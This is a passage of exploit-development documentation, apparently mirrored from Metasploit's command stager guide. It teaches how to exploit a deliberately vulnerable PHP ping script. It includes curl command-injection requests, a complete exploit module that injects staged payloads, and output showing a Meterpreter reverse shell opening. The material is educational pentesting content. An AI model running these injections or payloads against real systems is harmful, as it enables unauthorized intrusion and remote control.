<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        
        <meta name="author" content="darkcode0x00 luizcorrea">
        <link rel="canonical" href="https://darkcode357.gitlab.io/thg-framework/dev/dark/How-to-use-command-stagers/">
        <link rel="shortcut icon" href="../../../img/favicon.ico">
        <title>How to use command stagers - thg-framework</title>
        <link href="../../../css/bootstrap-custom.min.css" rel="stylesheet">
        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
        <link href="../../../css/base.css" rel="stylesheet">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!--[if lt IE 9]>
            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
        <![endif]-->

        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
        <script src="../../../js/bootstrap-3.0.3.min.js" defer></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
        <script>hljs.initHighlightingOnLoad();</script> 
    </head>

    <body>

        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
            <div class="container">

                <!-- Collapsed navigation -->
                <div class="navbar-header">
                    <!-- Expander button -->
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <a class="navbar-brand" href="../../..">thg-framework</a>
                </div>

                <!-- Expanded navigation -->
                <div class="navbar-collapse collapse">
                        <!-- Main navigation -->
                        <ul class="nav navbar-nav">
                            <li class="dropdown">
                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">Overview <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
<li >
    <a href="../../../cli/install/">Installation</a>
</li>
                                    
<li >
    <a href="../../..">Introduction</a>
</li>
                                    
<li >
    <a href="../../../community/">Community</a>
</li>
                                    
<li >
    <a href="../../../conceptual/">Conceptual</a>
</li>
                                    
<li >
    <a href="../../../cli/build/">build</a>
</li>
                                    
<li >
    <a href="../../../cli/tags/">tags</a>
</li>
                                    
<li >
    <a href="../../../LICENSE/">LICENSE</a>
</li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">thg_dev <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#">gettin_started</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../thg_dev/_Sidebar/">thg_Development_Environment</a>
</li>
            
<li >
    <a href="../../thg_dev/Using-thg/">using_thg</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#">git</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../git/Using-Git/">Using-Git</a>
</li>
            
<li >
    <a href="../../git/Git-cheatsheet/">Git_cheatsheet</a>
</li>
            
<li >
    <a href="../../git/Git-Reference-Sites/">Git-Reference-Sites</a>
</li>
    </ul>
  </li>
            
<li >
    <a href="../../thg_dev/Reporting-a-Bug/">reporting_a_bug</a>
</li>
            
<li >
    <a href="../../contributing/Contributing-to-thg/">Get Started</a>
</li>
            
<li >
    <a href="../../../cli/templates/">templates</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#">Roadmaps</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#">2019</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../roadmaps/2019/2019-Roadmap/">Roadmap</a>
</li>
            
<li >
    <a href="../../roadmaps/2019/2019-Roadmap-Review/">Roadmap_Review</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#">contributing</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../thg_dev/Contributing-to-thg/">contributing_to_thg</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#">thg_development</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../thg_dev/Style_Tips/">Style_Tips</a>
</li>
            
<li >
    <a href="../../thg_dev/How-to-get-started-with-writing-an-exploit/">How_to_get_started_with_writing_an_exploit</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">documentation <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#">capture the flag</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#">basic</a>
    <ul class="dropdown-menu">
            
  <li class="dropdown-submenu">
    <a href="#">analysis</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../capturetheflag/basic/analysis/linux/">linux</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/analysis/windows/">windows</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/analysis/malware/">malware</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">recovery</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../capturetheflag/basic/recover/backuo/">backup</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/recover/patching/">patching</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">tips_end_tricks</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../capturetheflag/basic/tips_end_tricks/tools/">tools</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/tips_end_tricks/decoding/">decoding</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/tips_end_tricks/dos/">dos</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/tips_end_tricks/os_cheats/">os_cheats</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/tips_end_tricks/snort/">snort</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">identify</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../capturetheflag/basic/identify/basic/">basic</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/identify/nmap/">nmap</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/identify/nessus/">nessus</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/identify/openvas/">openvas</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/identify/windows/">windows</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/identify/linux/">linux</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">defend</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../capturetheflag/basic/prootect_defend/windows/">windows</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/prootect_defend/linux/">linux</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">identify</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../capturetheflag/basic/detect/tcpdump/">tcpdump</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/detect/editcap/">edicap</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/detect/mergecap/">mergecap</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/detect/snort/">snort</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/detect/tshark/">tshark</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/detect/analysis/">analysis</a>
</li>
            
  <li class="dropdown-submenu">
    <a href="#">os</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../capturetheflag/basic/detect/linux/">linux</a>
</li>
            
<li >
    <a href="../../../capturetheflag/basic/detect/windows/">windows</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
            
<li >
    <a href="../../../deployment/">Deployment</a>
</li>
    </ul>
  </li>
            
  <li class="dropdown-submenu">
    <a href="#">hash_crack</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../capturetheflag/hash_crack/">index</a>
</li>
            
<li >
    <a href="../../../capturetheflag/hash_crack/CORE_HASH_CRACKING_KNOWLEDGE/">CORE_HASH_CRACKING_KNOWLEDGE</a>
</li>
    </ul>
  </li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#">pentest_standard</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../pentest_standard/preengagemente/">Pre engagement Interactions</a>
</li>
            
<li >
    <a href="../../../pentest_standard/ig/">Intelligence Gathering</a>
</li>
            
<li >
    <a href="../../../pentest_standard/threatmodeling/">Threat Modeling</a>
</li>
            
<li >
    <a href="../../../pentest_standard/vulnterability/">Vulnerability Analysis</a>
</li>
            
<li >
    <a href="../../../pentest_standard/exploration/">Exploitation</a>
</li>
            
<li >
    <a href="../../../pentest_standard/postexploration/">Post Exploitation</a>
</li>
            
<li >
    <a href="../../../pentest_standard/report/">Reporting</a>
</li>
            
<li >
    <a href="../../../pentest_standard/tecguidelines/">Technical Guidelines</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                            <li class="dropdown">
                                <a href="#" class="dropdown-toggle" data-toggle="dropdown">CLI <b class="caret"></b></a>
                                <ul class="dropdown-menu">
                                    
  <li class="dropdown-submenu">
    <a href="#">THG-PART-1</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../tutorials/thg/">THG</a>
</li>
            
<li >
    <a href="../../../tutorials/server/server/">thg_server</a>
</li>
            
<li >
    <a href="../../../tutorials/version/version/">thg_version</a>
</li>
            
<li >
    <a href="../../../tutorials/shells/shells/">thg_shells</a>
</li>
            
<li >
    <a href="../../../tutorials/thg_docs/thg_docs/">thg_docs</a>
</li>
            
<li >
    <a href="../../../tutorials/auxiliares/auxiliares/">thg_auxiliares</a>
</li>
            
<li >
    <a href="../../../tutorials/anti_forensic/anti_forensic/">thg_anti_forensic</a>
</li>
            
<li >
    <a href="../../../tutorials/crypto/crypto/">thg_crypto</a>
</li>
            
<li >
    <a href="../../../tutorials/drone/drone/">thg_drone</a>
</li>
            
<li >
    <a href="../../../tutorials/keylogger/keylogger/">thg_keylogger</a>
</li>
            
<li >
    <a href="../../../tutorials/recon/recon/">thg_recon</a>
</li>
            
<li >
    <a href="../../../tutorials/voip/voip/">thg_voip</a>
</li>
            
<li >
    <a href="../../../tutorials/automation/automation/">thg_automation</a>
</li>
            
<li >
    <a href="../../../tutorials/cryptography/cryptography/">thg_cryptography</a>
</li>
            
<li >
    <a href="../../../tutorials/exploitation/exploitation/">thg_exploitation</a>
</li>
            
<li >
    <a href="../../../tutorials/malware/malware/">thg_malware</a>
</li>
            
<li >
    <a href="../../../tutorials/reversing/reversing/">thg_reversing</a>
</li>
            
<li >
    <a href="../../../tutorials/thg_windows/thg_windows/">thg_windows</a>
</li>
            
<li >
    <a href="../../../tutorials/automobile/automobile/">thg_automobile</a>
</li>
            
<li >
    <a href="../../../tutorials/database/database/">thg_database</a>
</li>
            
<li >
    <a href="../../../tutorials/fingerprint/fingerprint/">thg_fingerprint</a>
</li>
            
<li >
    <a href="../../../tutorials/misc/misc/">thg_misc</a>
</li>
            
<li >
    <a href="../../../tutorials/sniffer/sniffer/">thg_sniffer</a>
</li>
            
<li >
    <a href="../../../tutorials/wireless/wireless/">thg_wireless</a>
</li>
            
<li >
    <a href="../../../tutorials/debugger/debugger/">thg_debugger</a>
</li>
            
<li >
    <a href="../../../tutorials/firmware/firmware/">thg_firmware</a>
</li>
            
<li >
    <a href="../../../tutorials/mobile/mobile/">thg_mobile</a>
</li>
            
<li >
    <a href="../../../tutorials/social/social/">thg_social</a>
</li>
            
<li >
    <a href="../../../tutorials/backdoor/backdoor/">thg_backdoor</a>
</li>
            
<li >
    <a href="../../../tutorials/decompiler/decompiler/">thg_decompiler</a>
</li>
            
<li >
    <a href="../../../tutorials/forensic/forensic/">thg_forensic</a>
</li>
    </ul>
  </li>
                                    
  <li class="dropdown-submenu">
    <a href="#">THG-PART-2</a>
    <ul class="dropdown-menu">
            
<li >
    <a href="../../../tutorials/networking/networking/">thg_networking</a>
</li>
            
<li >
    <a href="../../../tutorials/spoff/spoff/">thg_spoff</a>
</li>
            
<li >
    <a href="../../../tutorials/binary/binary/">thg_binary</a>
</li>
            
<li >
    <a href="../../../tutorials/defensensive/defensensive/">thg_defensensive</a>
</li>
            
<li >
    <a href="../../../tutorials/gpu/gpu/">thg_gpu</a>
</li>
            
<li >
    <a href="../../../tutorials/os/os/">thg_os</a>
</li>
            
<li >
    <a href="../../../tutorials/nfc/nfc/">thg_nfc</a>
</li>
            
<li >
    <a href="../../../tutorials/spoof/spoof/">thg_spoof</a>
</li>
            
<li >
    <a href="../../../tutorials/version/version/">thg_version</a>
</li>
            
<li >
    <a href="../../../tutorials/bluetooth/bluetooth/">thg_bluetooth</a>
</li>
            
<li >
    <a href="../../../tutorials/defensive/defensive/">thg_defensive</a>
</li>
            
<li >
    <a href="../../../tutorials/hardware/hardware/">thg_hardware</a>
</li>
            
<li >
    <a href="../../../tutorials/packer/packer/">thg_packer</a>
</li>
            
<li >
    <a href="../../../tutorials/stego/stego/">thg_stego</a>
</li>
            
<li >
    <a href="../../../tutorials/code_audit/code_audit/">thg_code_audit</a>
</li>
            
<li >
    <a href="../../../tutorials/disassembler/disassembler/">thg_disassembler</a>
</li>
            
<li >
    <a href="../../../tutorials/honeypot/honeypot/">thg_honeypot</a>
</li>
            
<li >
    <a href="../../../tutorials/proxy/proxy/">thg_proxy</a>
</li>
            
<li >
    <a href="../../../tutorials/tunnel/tunnel/">thg_tunnel</a>
</li>
            
<li >
    <a href="../../../tutorials/cracker/cracker/">thg_cracker</a>
</li>
            
<li >
    <a href="../../../tutorials/dos/dos/">thg_dos</a>
</li>
            
<li >
    <a href="../../../tutorials/ids/ids/">thg_ids</a>
</li>
            
<li >
    <a href="../../../tutorials/radio/radio/">thg_radio</a>
</li>
            
<li >
    <a href="../../../tutorials/unpacker/unpacker/">thg_unpacker</a>
</li>
    </ul>
  </li>
                                </ul>
                            </li>
                        </ul>

                    <ul class="nav navbar-nav navbar-right">
                        <li>
                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
                                <i class="fa fa-search"></i> Search
                            </a>
                        </li>
                            <li>
                                <a href="https://gitlab.com/darkcode357/thg-framework/edit/master/docs/dev/dark/How-to-use-command-stagers.md">Edit on darkcode357/thg-framework</a>
                            </li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="container">
                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
    <ul class="nav bs-sidenav">
        <li class="main active"><a href="#the-vulnerability-test-case">The Vulnerability Test Case</a></li>
        <li class="main "><a href="#the-msfexploitcmdstager-mixin">The Msf::Exploit::CmdStager Mixin</a></li>
        <li class="main "><a href="#flavors">Flavors</a></li>
            <li><a href="#vbs-command-stager-windows-only">VBS Command Stager - Windows Only</a></li>
            <li><a href="#certutil-command-stager-windows-only">Certutil Command Stager - Windows Only</a></li>
            <li><a href="#debug_write-command-stager-windows-only">Debug_write Command Stager - Windows Only</a></li>
            <li><a href="#debug_asm-command-stager-windows-only">Debug_asm Command Stager - Windows Only</a></li>
            <li><a href="#tftp-command-stager-windows-only">TFTP Command Stager - Windows Only</a></li>
            <li><a href="#bourne-command-stager-multi-platform">Bourne Command Stager - Multi Platform</a></li>
            <li><a href="#echo-command-stager-multi-platform">Echo Command Stager - Multi Platform</a></li>
            <li><a href="#printf-command-stager-multi-platform">Printf Command Stager - Multi Platform</a></li>
    </ul>
</div></div>
                <div class="col-md-9" role="main">

<p>Command stagers provide an easy way to write exploits against typical vulnerabilities such as <a href="https://www.owasp.org/index.php/Command_Injection">command execution</a> or <a href="https://www.owasp.org/index.php/Code_Injection">code injection</a>. There are currently eight different flavors of command stagers, each uses system command (or commands) to save your payload, sometimes decode, and execute.</p>
<h1 id="the-vulnerability-test-case">The Vulnerability Test Case</h1>
<p>The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in PHP, something silly you actually might see in an enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
   <span class="k">if</span> <span class="p">(</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;ip&quot;</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
      <span class="nv">$output</span> <span class="o">=</span> <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 1 &quot;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;ip&quot;</span><span class="p">]);</span>
      <span class="k">die</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
   <span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>

<span class="x">&lt;html&gt;</span>
<span class="x">&lt;body&gt;</span>
<span class="x">  &lt;form action = &quot;ping.php&quot; method = &quot;GET&quot;&gt;</span>
<span class="x">   IP to ping: &lt;input type = &quot;text&quot; name = &quot;ip&quot; /&gt; &lt;input type = &quot;submit&quot; /&gt;</span>
<span class="x">  &lt;/form&gt;</span>
<span class="x">   &lt;/body&gt;</span>
<span class="x">&lt;/html&gt;</span>
</pre></div>

<p>Place the above PHP script (ping.php) on an <a href="https://www.digitalocean.com/community/tutorials/how-to-install-linux-apache-mysql-php-lamp-stack-on-ubuntu-14-04">Ubuntu + Apache + PHP</a> server.</p>
<p>Under normal usage, this is how the script behaves - it just pings the host you specify, and shows
you the output:</p>
<div class="highlight"><pre><span></span>$ curl &quot;http://192.168.1.203/ping.php?ip=127.0.0.1&quot;
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.017 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
rtt min/avg/max/mdev = 0.017/0.017/0.017/0.000 ms
</pre></div>

<p>OK, now we can abuse that a little and execute another command (id):</p>
<div class="highlight"><pre><span></span>$ curl &quot;http://192.168.1.203/ping.php?ip=127.0.0.1+%26%26+id&quot;
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.020/0.020/0.020/0.000 ms
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre></div>

<p>See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it.</p>
<h1 id="the-msfexploitcmdstager-mixin">The Msf::Exploit::CmdStager Mixin</h1>
<p>Now let's talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do:</p>
<p><strong>1. Include the Msf::Exploit::CmdStager mixin</strong></p>
<p>Although there are eight flavors of mixins/stagers, you only need to include <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmdstager.rb">Msf::Exploit::CmdStager</a> when writing a Metasploit exploit. The mixin is basically an interface to all eight command stagers:</p>
<div class="highlight"><pre><span></span><span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">CmdStager</span>
</pre></div>

<p><strong>2. Declare your flavors</strong></p>
<p>To tell Msf::Exploit::CmdStager what flavors you want, you can add the <code>CmdStagerFlavor</code> info in the module's metadata. Either from the common level, or the target level. Multiple flavors are allowed.</p>
<p>An example of setting flavors for a specific target:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;Targets&#39;</span>   <span class="o">=&gt;</span>
  <span class="o">[</span>
    <span class="o">[</span> <span class="s1">&#39;Windows&#39;</span><span class="p">,</span>
      <span class="p">{</span>
        <span class="s1">&#39;Arch&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="no">ARCH_X86_64</span><span class="p">,</span> <span class="no">ARCH_X86</span> <span class="o">]</span><span class="p">,</span>
        <span class="s1">&#39;Platform&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;win&#39;</span><span class="p">,</span>
        <span class="s1">&#39;CmdStagerFlavor&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;certutil&#39;</span><span class="p">,</span> <span class="s1">&#39;vbs&#39;</span> <span class="o">]</span>
      <span class="p">}</span>
    <span class="o">]</span>
  <span class="o">]</span>
</pre></div>

<p>Or, you can pass this info to the execute_cmdstager method (see Call #execute_cmdstager to begin)</p>
<div class="highlight"><pre><span></span><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor</span><span class="p">:</span> <span class="ss">:vbs</span><span class="p">)</span>
</pre></div>

<p><strong>3. Create the execute_command method</strong></p>
<p>You also must create a <code>def execute_command(cmd, opts = {})</code> method in your module. This is what gets called by the CmdStager mixin when it kicks in. Your objective in this method is to inject whatever is in the <code>cmd</code> variable to the vulnerable code.</p>
<p><strong>4. Call #execute_cmdstager to begin</strong></p>
<p>And lastly, in your exploit method, call <code>execute_cmdstager</code> to begin the command stager.</p>
<p>Over the years, we have also learned that these options are quite handy when calling
execute_cmdstager:</p>
<ul>
<li><strong>flavor</strong> - You can specify what command stager (flavor) to use from here. Options are: <code>:bourne</code>, <code>:debug_asm</code>, <code>:debug_write</code>, <code>:echo</code>, <code>:printf</code>, <code>:vbs</code>, <code>:certutil</code>, <code>:tftp</code>.</li>
<li><strong>delay</strong> - How much time to delay between each command execution. 0.25 is default.</li>
<li><strong>linemax</strong> - Maximum number of characters per command. 2047 is default.</li>
</ul>
<p><strong>Msf::Exploit::CmdStager Template</strong></p>
<p>At the minimum, this is how your exploit should start when you're using the CmdStager mixin:</p>
<div class="highlight"><pre><span></span><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>

<span class="k">class</span> <span class="nc">MetasploitModule</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>

  <span class="no">Rank</span> <span class="o">=</span> <span class="no">NormalRanking</span>

  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">CmdStager</span>

  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span><span class="o">=</span><span class="p">{})</span>
    <span class="k">super</span><span class="p">(</span><span class="n">update_info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
      <span class="s1">&#39;Name&#39;</span>            <span class="o">=&gt;</span> <span class="s2">&quot;Command Injection Using CmdStager&quot;</span><span class="p">,</span>
      <span class="s1">&#39;Description&#39;</span>     <span class="o">=&gt;</span> <span class="sx">%q{</span>
<span class="sx">        This exploits a command injection using the command stager.</span>
<span class="sx">      }</span><span class="p">,</span>
      <span class="s1">&#39;License&#39;</span>         <span class="o">=&gt;</span> <span class="no">MSF_LICENSE</span><span class="p">,</span>
      <span class="s1">&#39;Author&#39;</span>          <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;sinn3r&#39;</span> <span class="o">]</span><span class="p">,</span>
      <span class="s1">&#39;References&#39;</span>      <span class="o">=&gt;</span> <span class="o">[</span> <span class="o">[</span> <span class="s1">&#39;URL&#39;</span><span class="p">,</span> <span class="s1">&#39;http://metasploit.com&#39;</span> <span class="o">]</span> <span class="o">]</span><span class="p">,</span>
      <span class="s1">&#39;Platform&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;linux&#39;</span><span class="p">,</span>
      <span class="s1">&#39;Targets&#39;</span>         <span class="o">=&gt;</span> <span class="o">[</span> <span class="o">[</span> <span class="s1">&#39;Linux&#39;</span><span class="p">,</span> <span class="p">{}</span> <span class="o">]</span> <span class="o">]</span><span class="p">,</span>
      <span class="s1">&#39;Payload&#39;</span>         <span class="o">=&gt;</span> <span class="p">{</span> <span class="s1">&#39;BadChars&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="p">},</span>
      <span class="s1">&#39;CmdStagerFlavor&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;printf&#39;</span> <span class="o">]</span><span class="p">,</span>
      <span class="s1">&#39;Privileged&#39;</span>      <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
      <span class="s1">&#39;DisclosureDate&#39;</span>  <span class="o">=&gt;</span> <span class="s2">&quot;Jun 10 2016&quot;</span><span class="p">,</span>
      <span class="s1">&#39;DefaultTarget&#39;</span>   <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">opts</span> <span class="o">=</span> <span class="p">{})</span>
    <span class="c1"># calls some method to inject cmd to the vulnerable code.</span>
  <span class="k">end</span>

  <span class="k">def</span> <span class="nf">exploit</span>
    <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Exploiting...&quot;</span><span class="p">)</span>
    <span class="n">execute_cmdstager</span>
  <span class="k">end</span>

<span class="k">end</span>
</pre></div>

<p>As you can see, we have chosen the "printf" flavor as our command stager. We will explain more about
this later, but basically what it does is it writes our payload to /tmp and execute it.</p>
<p>Now let's modify the execute_command method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this:</p>
<div class="highlight"><pre><span></span>127.0.0.1+%26%26+[Malicious commands]
</pre></div>

<p>We do that in execute_command using <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-Send-an-HTTP-Request-Using-HTTPClient">HttpClient</a>. Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected:</p>
<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
  <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/chmod \+x/</span><span class="p">,</span> <span class="s1">&#39;chmod 777&#39;</span><span class="p">)</span>
  <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/;/</span><span class="p">,</span> <span class="s1">&#39; %26%26 &#39;</span><span class="p">)</span>
  <span class="n">cmd</span><span class="o">.</span><span class="n">gsub!</span><span class="p">(</span><span class="sr">/ /</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">)</span>
<span class="k">end</span>

<span class="k">def</span> <span class="nf">execute_command</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">opts</span> <span class="o">=</span> <span class="p">{})</span>
  <span class="n">send_request_cgi</span><span class="p">({</span>
    <span class="s1">&#39;method&#39;</span>        <span class="o">=&gt;</span> <span class="s1">&#39;GET&#39;</span><span class="p">,</span>
    <span class="s1">&#39;uri&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;/ping.php&#39;</span><span class="p">,</span>
    <span class="s1">&#39;encode_params&#39;</span> <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
    <span class="s1">&#39;vars_get&#39;</span>      <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="s1">&#39;ip&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;127.0.0.1+%26%26+</span><span class="si">#{</span><span class="n">filter_bad_chars</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
    <span class="p">}</span>
  <span class="p">})</span>
<span class="k">end</span>

<span class="k">def</span> <span class="nf">exploit</span>
  <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Exploiting...&quot;</span><span class="p">)</span>
  <span class="n">execute_cmdstager</span>
<span class="k">end</span>
</pre></div>

<p>And let's run that, we should have a shell:</p>
<div class="highlight"><pre><span></span>msf exploit(cmdstager_demo) &gt; run

[*] Started reverse TCP handler on 10.6.0.92:4444 
[*] Exploiting...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 10.6.0.92
[*] Meterpreter session 1 opened (10.6.0.92:4444 -&gt; 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
</pre></div>

<h1 id="flavors">Flavors</h1>
<p>Now that we know how to use the Msf::Exploit::CmdStager mixin, let's take a look at the command
stagers you can use.</p>
<h2 id="vbs-command-stager-windows-only">VBS Command Stager - Windows Only</h2>
<p>The <a href="https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/exploitation/cmdstager/vbs.rb">VBS command stager</a> is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a <a href="https://github.com/rapid7/metasploit-framework/blob/master/data/exploits/cmdstager/vbs_b64">VBS script</a> using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it.</p>
<p>If you are exploiting Windows that supports Powershell, then you might want to <a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Powershell-in-an-exploit">consider using that instead</a> of the VBS stager, because Powershell tends to be more stealthy.</p>
<p>To use the VBS stager, either specify your CmdStagerFlavor in the metadata:</p>
<div class="highlight"><pre><span></span><span class="s1">&#39;CmdStagerFlavor&#39;</span> <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;vbs&#39;</span> <span class="o">]</span>
</pre></div>

<p>Or set the :vbs key to execute_cmdstager:</p>
<div class="highlight"><pre><span></span><span class="n">execute_cmdstager</span><span class="p">(</span><span class="ss">flavor</span><span class="p">:</span> <span class="ss">:vbs</span><span class="p">)</span>
</pre></div>

